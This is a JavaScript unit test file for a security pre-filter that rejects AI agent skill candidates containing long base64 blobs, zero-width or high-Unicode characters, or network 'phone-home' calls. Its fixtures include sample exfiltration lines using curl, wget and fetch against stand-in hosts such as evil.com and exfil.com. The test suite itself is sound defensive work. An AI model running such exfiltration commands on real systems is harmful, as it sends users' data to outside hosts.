'use strict';

/**
 * Unit tests for the security pre-filter rules (topgun-comparator.md Step 2).
 * Pure function tests — no CLI, no filesystem.
 * Run: node --test tests/pre-filters.test.cjs
 */

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');

// ─── Pre-filter functions (mirrors topgun-comparator.md Step 2) ───────────────

// Base64 detection: sequences of 100+ base64 characters
// NOTE: topgun-comparator.md uses {100,} but our spec says {50,}
// We use {100,} to match the comparator agent's actual rule.
const BASE64_RE = /[A-Za-z0-9+/]{100,}={0,2}/;

// High Unicode: codepoints above U+2000
const HIGH_UNICODE_RE = /[\u2001-\uFFFF]/;

// Zero-width characters
const ZERO_WIDTH_RE = /[\u200B-\u200F\u2028-\u202F\uFEFF]/;

// Phone-home patterns: curl, wget, fetch in code fences context
const PHONE_HOME_PATTERNS = ['curl ', 'wget ', 'fetch('];

function detectBase64(text) {
  return BASE64_RE.test(text);
}

function detectHighUnicode(text) {
  return HIGH_UNICODE_RE.test(text);
}

function detectZeroWidth(text) {
  return ZERO_WIDTH_RE.test(text);
}

function detectPhoneHome(text) {
  return PHONE_HOME_PATTERNS.some(p => text.includes(p));
}

function applyPreFilters(candidate) {
  const fieldsToCheck = [
    candidate.name || '',
    candidate.description || '',
    candidate.install_url || '',
    ...Object.values(candidate.raw_metadata || {}).filter(v => typeof v === 'string'),
  ];

  for (const field of fieldsToCheck) {
    if (detectBase64(field)) return { rejected: true, reason: 'base64' };
    // Check zero-width before high-unicode: zero-width chars (U+200B etc.) fall within
    // the high-unicode range, so zero-width must be tested first to give a specific reason.
    if (detectZeroWidth(field)) return { rejected: true, reason: 'zero-width' };
    if (detectHighUnicode(field)) return { rejected: true, reason: 'high-unicode' };
  }

  // Phone-home check also includes code fence content
  const allText = fieldsToCheck.join('\n');
  if (detectPhoneHome(allText)) return { rejected: true, reason: 'phone-home' };

  return { rejected: false };
}

// ─── Base64 detection ─────────────────────────────────────────────────────────

describe('base64 detection', () => {
  test('short base64-like string (< 100 chars) — should pass', () => {
    const short = 'SGVsbG8gV29ybGQ='; // "Hello World" in base64 (16 chars)
    assert.equal(detectBase64(short), false);
  });

  test('exactly 100 base64 chars — should be detected', () => {
    // 100 alphanumeric chars matching [A-Za-z0-9+/]
    const long = 'A'.repeat(100);
    assert.equal(detectBase64(long), true);
  });

  test('long base64 blob in description — rejected', () => {
    // 100 base64-alphabet chars (no padding needed) — hits the {100,} threshold exactly
    const blob = 'A'.repeat(100);
    assert.equal(detectBase64(blob), true);
    const candidate = { name: 'malicious-skill', description: blob, install_url: '', raw_metadata: {} };
    const result = applyPreFilters(candidate);
    assert.equal(result.rejected, true);
    assert.equal(result.reason, 'base64');
  });

  test('clean description with no blobs — passes', () => {
    const text = 'Kubernetes deployment automation skill for rolling updates and canary releases.';
    assert.equal(detectBase64(text), false);
  });
});

// ─── High Unicode detection ───────────────────────────────────────────────────

describe('high unicode detection (> U+2000)', () => {
  test('regular ASCII text — passes', () => {
    assert.equal(detectHighUnicode('Hello World deploy skill'), false);
  });

  test('standard punctuation and accented chars (below U+2000) — passes', () => {
    // é = U+00E9, ñ = U+00F1 — both below U+2000
    assert.equal(detectHighUnicode('café résumé señor'), false);
  });

  test('em dash U+2014 (above U+2000) — detected', () => {
    const text = 'deploy \u2014 kubernetes skill';
    assert.equal(detectHighUnicode(text), true);
  });

  test('Chinese character U+4E2D — detected', () => {
    const text = 'skill with \u4E2D unicode';
    assert.equal(detectHighUnicode(text), true);
  });

  test('emoji U+1F600 — detected', () => {
    const text = 'awesome skill \uD83D\uDE00';
    // Note: emoji are > U+FFFF but encoded as surrogate pairs — U+D83D is in range
    assert.equal(detectHighUnicode(text), true);
  });

  test('high unicode in name triggers rejection', () => {
    const candidate = { name: 'malicious\u2014skill', description: 'clean', install_url: '', raw_metadata: {} };
    const result = applyPreFilters(candidate);
    assert.equal(result.rejected, true);
    assert.equal(result.reason, 'high-unicode');
  });
});

// ─── Zero-width character detection ──────────────────────────────────────────

describe('zero-width character detection', () => {
  test('clean text — passes', () => {
    assert.equal(detectZeroWidth('deploy kubernetes automation'), false);
  });

  test('U+200B (zero-width space) — detected', () => {
    const text = 'deploy\u200Bkubernetes';
    assert.equal(detectZeroWidth(text), true);
  });

  test('U+FEFF (byte-order mark / zero-width no-break space) — detected', () => {
    const text = '\uFEFFskill content';
    assert.equal(detectZeroWidth(text), true);
  });

  test('U+200C (zero-width non-joiner) — detected', () => {
    const text = 'deploy\u200Cskill';
    assert.equal(detectZeroWidth(text), true);
  });

  test('U+2028 (line separator) — detected', () => {
    const text = 'line1\u2028line2';
    assert.equal(detectZeroWidth(text), true);
  });

  test('zero-width in raw_metadata triggers rejection', () => {
    const candidate = {
      name: 'clean-skill',
      description: 'clean description',
      install_url: 'https://example.com/skill',
      raw_metadata: { author: 'attacker\u200B' },
    };
    const result = applyPreFilters(candidate);
    assert.equal(result.rejected, true);
    assert.equal(result.reason, 'zero-width');
  });
});

// ─── Phone-home detection ────────────────────────────────────────────────────

describe('phone-home detection in code fences', () => {
  test('curl command — detected', () => {
    const text = '```bash\ncurl https://evil.com/exfil\n```';
    assert.equal(detectPhoneHome(text), true);
  });

  test('wget command — detected', () => {
    const text = 'use wget https://collector.example.com to send data';
    assert.equal(detectPhoneHome(text), true);
  });

  test('fetch() call — detected', () => {
    const text = 'const res = await fetch(\"https://exfil.com/log\")';
    assert.equal(detectPhoneHome(text), true);
  });

  test('clean SKILL.md without network calls — passes', () => {
    const cleanSkill = `---
name: kube-deploy
description: Kubernetes deployment automation
allowed-tools: [Read, Write, Bash, Grep]
---

# Kubernetes Deploy Skill

This skill automates Kubernetes deployment workflows.

## Usage

Run \`kubectl apply -f deployment.yaml\` to deploy.

## Steps

1. Read deployment configuration
2. Apply to cluster
3. Verify rollout status
`;
    assert.equal(detectPhoneHome(cleanSkill), false);
    const candidate = {
      name: 'kube-deploy',
      description: 'clean',
      install_url: 'https://skills.sh/kube-deploy',
      raw_metadata: {},
    };
    // Simulate SKILL.md content being part of description or checked separately
    const result = applyPreFilters(candidate);
    assert.equal(result.rejected, false);
  });

  test('curl in name field triggers rejection via applyPreFilters', () => {
    const candidate = {
      name: 'skill-that-does-curl https://evil.com',
      description: 'legitimate description',
      install_url: '',
      raw_metadata: {},
    };
    const result = applyPreFilters(candidate);
    assert.equal(result.rejected, true);
    assert.equal(result.reason, 'phone-home');
  });

  test('curl without space (e.g. "curling") — not detected (false positive prevention)', () => {
    // "curl " (with space) is the trigger — "curling" should NOT trigger it
    const text = 'This skill is for curling and sweeping operations';
    assert.equal(detectPhoneHome(text), false);
  });
});

// ─── applyPreFilters: combined candidate test ─────────────────────────────────

describe('applyPreFilters combined', () => {
  test('fully clean candidate — not rejected', () => {
    const candidate = {
      name: 'kube-deploy',
      description: 'Kubernetes deployment automation for rolling updates and canary releases.',
      install_url: 'https://skills.sh/kube-deploy/SKILL.md',
      raw_metadata: { author: 'alo-labs', license: 'MIT' },
    };
    const result = applyPreFilters(candidate);
    assert.equal(result.rejected, false);
  });

  test('base64 blob in install_url — rejected', () => {
    const blob = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
    const candidate = {
      name: 'malicious-skill',
      description: 'clean',
      install_url: `https://example.com/${blob}`,
      raw_metadata: {},
    };
    const result = applyPreFilters(candidate);
    assert.equal(result.rejected, true);
    assert.equal(result.reason, 'base64');
  });
});
